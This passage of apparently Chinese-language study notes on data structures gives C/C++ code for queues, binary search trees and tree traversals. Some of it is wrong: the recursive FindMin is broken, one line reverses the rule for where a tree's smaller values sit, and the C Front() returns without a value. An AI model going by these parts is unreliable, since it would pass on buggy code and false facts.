class="line"></span><br><span class="line">	<span class="comment">// Removes an element in Queue from front end. </span></span><br><span class="line">	<span class="type">void</span> <span class="title function_">Dequeue</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Dequeuing \n&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(IsEmpty())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Error: Queue is Empty\n&quot;</span>;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(front == rear ) </span><br><span class="line">		&#123;</span><br><span class="line">			rear = front = <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			front = (front+<span class="number">1</span>)%MAX_SIZE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Returns element at front of queue. </span></span><br><span class="line">	<span class="type">int</span> <span class="title function_">Front</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(front == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Error: cannot return front from empty queue\n&quot;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> A[front];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	   Printing the elements in queue from front to rear. </span></span><br><span class="line"><span class="comment">	   This function is only to test the code. </span></span><br><span class="line"><span class="comment">	   This is not a standard function for Queue implementation. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Finding number of elements in queue  </span></span><br><span class="line">		<span class="type">int</span> count = (rear+MAX_SIZE-front)%MAX_SIZE + <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Queue       : &quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;count; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> index = (front+i) % MAX_SIZE; <span class="comment">// Index of element while travesing circularly from front</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;A[index]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*Driver Code to test the implementation</span></span><br><span class="line"><span class="comment">	  Printing the elements in Queue after each Enqueue or Dequeue </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">   Queue Q; <span class="comment">// creating an instance of Queue. </span></span><br><span class="line">   Q.Enqueue(<span class="number">2</span>);  Q.Print();  </span><br><span class="line">   Q.Enqueue(<span class="number">4</span>);  Q.Print();  </span><br><span class="line">   Q.Enqueue(<span class="number">6</span>);  Q.Print();</span><br><span class="line">   Q.Dequeue();	  Q.Print();</span><br><span class="line">   Q.Enqueue(<span class="number">8</span>);  Q.Print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用链表实现队列"><a href="#使用链表实现队列" class="headerlink" title="使用链表实现队列"></a>使用链表实现队列</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// Two glboal variables to store address of front and rear nodes. </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">front</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">rear</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// To Enqueue an integer</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Enqueue</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> </span><br><span class="line">		(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">	temp-&gt;data =x; </span><br><span class="line">	temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>(front == <span class="literal">NULL</span> &amp;&amp; rear == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		front = rear = temp;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	rear-&gt;next = temp;</span><br><span class="line">	rear = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// To Dequeue an integer.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Dequeue</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> front;</span><br><span class="line">	<span class="keyword">if</span>(front == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Queue is Empty\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(front == rear) &#123;</span><br><span class="line">		front = rear = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		front = front-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Front</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(front == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Queue is empty\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> front-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> front;</span><br><span class="line">	<span class="keyword">while</span>(temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,temp-&gt;data);</span><br><span class="line">		temp = temp-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">/* Drive code to test the implementation. */</span></span><br><span class="line">	<span class="comment">// Printing elements in Queue after each Enqueue or Dequeue </span></span><br><span class="line">	Enqueue(<span class="number">2</span>); Print(); </span><br><span class="line">	Enqueue(<span class="number">4</span>); Print();</span><br><span class="line">	Enqueue(<span class="number">6</span>); Print();</span><br><span class="line">	Dequeue();  Print();</span><br><span class="line">	Enqueue(<span class="number">8</span>); Print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="树-tree"><a href="#树-tree" class="headerlink" title="树(tree)"></a>树(tree)</h2><p> 数是经常被用来表示层次数据的一种非线性数据结构，树这种数据结构可以被定义为：链接在一起的被称为节点的实体的集合.</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-22 121157.png)</p>
<blockquote>
<p>root</p>
<p>children</p>
<p>Parent</p>
<p>sibling (have sane parent)</p>
<p>leaf (has no chlidren)</p>
<p>if we can go from A to B(These links are not bidirectional.)</p>
<p>A is ancestor of B ;B is descendent of A.</p>
<p>sub-trees (子树)</p>
<p>Depth and Height</p>
<p>depth of x &#x3D; NO. of edges in path from root to x</p>
<p>height of x&#x3D; NO. of edges in longest path from x to a leaf.(height of tree is  height of root node)</p>
</blockquote>
<p><strong>Binary Tree(二叉树)</strong></p>
<p>a tree in which each node can have at most 2 children</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-22 122654.png)</p>
<p>(偷张图…)</p>
<p><strong>Applications</strong></p>
<p>1） Storing naturally hierachical data（存储天然具备层级结构的数据）</p>
<p>eg: file system(磁盘驱动器上的文件系统)</p>
<p>2）organzie data  for quick search ,insertion,deletion(组织数据)</p>
<p>eg: Binary Search tees (二叉搜索树)</p>
<p>3）Trie树 -&gt; 存储dictionary</p>
<p>4） Network Eouting algorithm(网络路由算法)</p>
<h3 id="二叉树-binary-tree"><a href="#二叉树-binary-tree" class="headerlink" title="二叉树(binary tree)"></a>二叉树(binary tree)</h3><blockquote>
<p>each node can have most 2 children</p>
</blockquote>
<p><strong>Strict&#x2F;Proper binary tree</strong></p>
<blockquote>
<p>each node can have either 2 or 0 children</p>
</blockquote>
<p><strong>Complete Binary tree</strong></p>
<blockquote>
<p>all levels except possibly the last are completely filled and all nodes are as left as possible</p>
<p>最后一层除外每层都要被填满且左对齐</p>
</blockquote>
<p>max number of nodes at level i&#x3D; 2^i</p>
<p><strong>Perfect Binary tree</strong></p>
<blockquote>
<p> 每层都被填满</p>
</blockquote>
<p>Maximum no of nodes in a tree with heighe h &#x3D;2^0 +2^1 +2^2 + 2^3……..+2^h&#x3D; 2^(h+1)-1</p>
<p>n&#x3D;number of nodes</p>
<p>h&#x3D;log2(n+1)-1</p>
<p><strong>Balanced binary tree</strong></p>
<blockquote>
<p>difference between height of let and right subtree for every node is not more than K(mostly 1)</p>
</blockquote>
<p>Height of an empty tree &#x3D;-1</p>
<p>Height of tree with 1 node&#x3D;0</p>
<h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>Binary Search Tree(Balanced)时间成本</p>
<blockquote>
<p>Search(x)        O(logn)</p>
<p>Insert(x)          O(logn)</p>
<p>Remove(x)      O(logn)</p>
</blockquote>
<p>二进制搜索树是一种二叉树，其中每一个节点，所有的左子树上的节点值都比该节点的值要小，所有右子树上的节点值都比该节点的值要大，子叶的值比root的值小即可</p>
<h4 id="c-x2F-c-实现"><a href="#c-x2F-c-实现" class="headerlink" title="c&#x2F;c++实现"></a>c&#x2F;c++实现</h4><p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-06-05 141409.png)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BstNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    BstNode* left;</span><br><span class="line">    BstNode* right;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">BstNode* <span class="title">GetNewNode</span><span class="params">(<span class="type">int</span> data)</span></span>&#123;</span><br><span class="line">    BstNode* newNode=<span class="keyword">new</span> <span class="built_in">BstNode</span>();</span><br><span class="line">    newNode-&gt;data=data;</span><br><span class="line">    newNode-&gt;left=newNode-&gt;right=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BstNode* <span class="title">Insert</span><span class="params">(BstNode* root ,<span class="type">int</span> data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        root=<span class="built_in">GetNewNode</span>(data);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(data&lt;=root-&gt;data)&#123;<span class="comment">//递归</span></span><br><span class="line">        root-&gt;left=<span class="built_in">Insert</span>(root-&gt;left,data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        root-&gt;right=<span class="built_in">Insert</span>(root-&gt;right,data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Search</span><span class="params">(BstNode* root,<span class="type">int</span> data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;data==data) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(data&lt;=root-&gt;data)<span class="keyword">return</span> <span class="built_in">Search</span>(root-&gt;left,data);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">Search</span>(root-&gt;right,data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    BstNode* root=<span class="literal">NULL</span>;<span class="comment">//creating an empty tree</span></span><br><span class="line">    root=<span class="built_in">Insert</span>(root,<span class="number">15</span>);</span><br><span class="line">    root=<span class="built_in">Insert</span>(root,<span class="number">10</span>);</span><br><span class="line">    root=<span class="built_in">Insert</span>(root,<span class="number">20</span>);</span><br><span class="line">    root=<span class="built_in">Insert</span>(root,<span class="number">25</span>);</span><br><span class="line">    root=<span class="built_in">Insert</span>(root,<span class="number">8</span>);</span><br><span class="line">    root=<span class="built_in">Insert</span>(root,<span class="number">12</span>);</span><br><span class="line">    <span class="type">int</span> number;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Enter number be searched\n&quot;</span>;</span><br><span class="line">    cin&gt;&gt;number;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Search</span>(root,number)==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;Found\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;Not Found\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter number be searched</span><br><span class="line">15</span><br><span class="line">Found</span><br><span class="line">Enter number be searched</span><br><span class="line">20</span><br><span class="line">Found</span><br><span class="line">Enter number be searched</span><br><span class="line">18</span><br><span class="line">Not Found</span><br><span class="line">Enter number be searched</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下面穿插一个基础知识点</p>
<p>系统会分配一个程序或者应用的内存，在典型架构中，会被分为四个段。代码段(code(text))是用来存放程序指令(指令是编译好的机器语言)；一个段(Static&#x2F;Global)用于存放全局变量(在所有函数外部声明的变量被称为全局变量，可以被任何函数访问);下一个段是栈段，基本是是一个暂存空间(用来执行函数，暂存所有的局部变量，所有在函数内部声明的变量存活于栈上)；最后一个段是堆段，也被称为自由的存储空间(动态内存，根据我们的需要增加或减小)，其他段的大小都是固定的，也就在编译时决定，但是堆可以在运行时增长。</p>
<p>在上边的程序中，我们需要想象出栈段和堆段的交互过程</p>
<h4 id="查找最小值和最大值"><a href="#查找最小值和最大值" class="headerlink" title="查找最小值和最大值"></a>查找最小值和最大值</h4><p>左子树大，右子树小</p>
<p><strong>使用迭代的方式实现Findmin函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BstNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    BstNode* left;</span><br><span class="line">    BstNode* right;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">FindeMin</span><span class="params">(BstNode* root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Error: Tree is empty\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BstNode* current =root;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        current=current-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用递归的方式实现Findmin函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BstNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    BstNode* left;</span><br><span class="line">    BstNode* right;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">FindMin</span><span class="params">(BstNode* root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Error: Tree is empty\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BstNode* current =root;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> current-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FindMin(current-&gt;left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二叉树的高度和深度"><a href="#二叉树的高度和深度" class="headerlink" title="二叉树的高度和深度"></a>二叉树的高度和深度</h4><p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-06-22 173802.png)</p>
<h4 id="二叉树的遍历-广度优先vs深度优先"><a href="#二叉树的遍历-广度优先vs深度优先" class="headerlink" title="二叉树的遍历-广度优先vs深度优先"></a>二叉树的遍历-广度优先vs深度优先</h4><p>树并不是一个线性的数据结构，树的遍历被称为访问树的每个结点的过程，按照某种顺序每个节点仅被访问一次，访问的意思是读取或者修改节点中的数据</p>
<blockquote>
<p>Binary Tree Tracersal</p>
<p>Breadth-first(广度优先)</p>
<p>一层一层访问</p>
<p>Depth-first(深度优先)</p>
<p>访问一个孩子的同时访问那个路径上的完整子树，一般有LDR,DLR,LRD三种方式L(左子树)D(data)R(右子树)</p>
</blockquote>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-06-23 152121.png)</p>
<p>具体实现</p>
<p>Preorder(DLR)</p>
<p>F,D,B,A,C,E,J,G,I,H,K</p>
<p>Inorder(LDR)</p>
<p>A,B,C,D,E,F,G,H,I,J,K</p>
<p>Postorder(LRD)</p>
<p>A.C.B.E.D.H.I.G.K.J,F</p>
<h4 id="C-实现层次遍历"><a href="#C-实现层次遍历" class="headerlink" title="C++实现层次遍历"></a>C++实现层次遍历</h4><p>基本上属于广度优先遍历</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Binary tree - Level Order Traversal */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">	<span class="type">char</span> data;</span><br><span class="line">	Node *left;</span><br><span class="line">	Node *right;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function to print Nodes in a binary tree in Level order</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LevelOrder</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">	queue&lt;Node*&gt; Q;</span><br><span class="line">	Q.<span class="built_in">push</span>(root);  </span><br><span class="line">	<span class="comment">//while there is at least one discovered node</span></span><br><span class="line">	<span class="keyword">while</span>(!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">		Node* current = Q.<span class="built_in">front</span>();</span><br><span class="line">		Q.<span class="built_in">pop</span>(); <span class="comment">// removing the element at front</span></span><br><span class="line">		cout&lt;&lt;current-&gt;data&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span>) Q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">		<span class="keyword">if</span>(current-&gt;right != <span class="literal">NULL</span>) Q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Function to Insert Node in a Binary Search Tree</span></span><br><span class="line"><span class="function">Node* <span class="title">Insert</span><span class="params">(Node *root,<span class="type">char</span> data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		root = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">		root-&gt;data = data;</span><br><span class="line">		root-&gt;left = root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(data &lt;= root-&gt;data) root-&gt;left = <span class="built_in">Insert</span>(root-&gt;left,data);</span><br><span class="line">	<span class="keyword">else</span> root-&gt;right = <span class="built_in">Insert</span>(root-&gt;right,data);</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*Code To Test the logic</span></span><br><span class="line"><span class="comment">	  Creating an example tree</span></span><br><span class="line"><span class="comment">	                    M</span></span><br><span class="line"><span class="comment">			   / \</span></span><br><span class="line"><span class="comment">			  B   Q</span></span><br><span class="line"><span class="comment">			 / \   \</span></span><br><span class="line"><span class="comment">			A   C   Z</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	Node* root = <span class="literal">NULL</span>;</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;M&#x27;</span>); root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;Q&#x27;</span>); root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;Z&#x27;</span>); </span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;A&#x27;</span>); root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">	<span class="comment">//Print Nodes in Level Order. </span></span><br><span class="line">	<span class="built_in">LevelOrder</span>(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>层次遍历的时间复杂度O(n)</p>
<h4 id="c-实现深度遍历"><a href="#c-实现深度遍历" class="headerlink" title="c++实现深度遍历"></a>c++实现深度遍历</h4><p>前序中序后序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Binary Tree Traversal - Preorder, Inorder, Postorder */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">	<span class="type">char</span> data;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *left;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *right;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function to visit nodes in Preorder</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Preorder</span><span class="params">(<span class="keyword">struct</span> Node *root)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// base condition for recursion</span></span><br><span class="line">	<span class="comment">// if tree/sub-tree is empty, return and exit</span></span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,root-&gt;data); <span class="comment">// Print data</span></span><br><span class="line">	<span class="built_in">Preorder</span>(root-&gt;left);     <span class="comment">// Visit left subtree</span></span><br><span class="line">	<span class="built_in">Preorder</span>(root-&gt;right);    <span class="comment">// Visit right subtree</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function to visit nodes in Inorder</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Inorder</span>(root-&gt;left);       <span class="comment">//Visit left subtree</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,root-&gt;data);  <span class="comment">//Print data</span></span><br><span class="line">	<span class="built_in">Inorder</span>(root-&gt;right);      <span class="comment">// Visit right subtree</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function to visit nodes in Postorder</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Postorder</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Postorder</span>(root-&gt;left);    <span class="comment">// Visit left subtree</span></span><br><span class="line">	<span class="built_in">Postorder</span>(root-&gt;right);   <span class="comment">// Visit right subtree</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,root-&gt;data); <span class="comment">// Print data</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function to Insert Node in a Binary Search Tree</span></span><br><span class="line"><span class="function">Node* <span class="title">Insert</span><span class="params">(Node *root,<span class="type">char</span> data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		root = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">		root-&gt;data = data;</span><br><span class="line">		root-&gt;left = root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(data &lt;= root-&gt;data)</span><br><span class="line">		root-&gt;left = <span class="built_in">Insert</span>(root-&gt;left,data);</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		root-&gt;right = <span class="built_in">Insert</span>(root-&gt;right,data);</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*Code To Test the logic</span></span><br><span class="line"><span class="comment">	  Creating an example tree</span></span><br><span class="line"><span class="comment">	                    M</span></span><br><span class="line"><span class="comment">			   / \</span></span><br><span class="line"><span class="comment">			  B   Q</span></span><br><span class="line"><span class="comment">			 / \   \</span></span><br><span class="line"><span class="comment">			A   C   Z</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	Node* root = <span class="literal">NULL</span>;</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;M&#x27;</span>); root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;Q&#x27;</span>); root = <span 